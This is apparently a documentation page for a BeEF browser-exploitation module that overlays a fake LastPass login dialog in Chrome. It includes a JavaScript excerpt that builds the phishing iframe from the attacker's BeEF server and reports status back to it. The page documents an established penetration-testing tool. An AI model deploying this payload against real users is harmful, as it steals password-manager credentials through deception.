## Summary

* **Objective**: Fake LastPass
* **Authors**: xntrik, gcattani
* **Browsers**: Chrome

* [Code](https://github.com/beefproject/beef/tree/master/modules/social_engineering/fake_lastpass)

## Internal Working

This module displays a fake LastPass user dialog via iFrame to steal credentials. The pages are hosted on the beef server.

```js
if (beef.browser.isC()) {
    beef.dom.createIframe('custom', {'src':beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/lp/index.html','id':'LPIFRAME'}, {'width':'294px','height':'352px','position':'fixed','right':'5px','top':'0px','z-index':beef.dom.getHighestZindex()+1,'border':'1px solid white','overflow':'hidden'});
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Chrome IFrame Created .. awaiting messages');
```


## Feedback

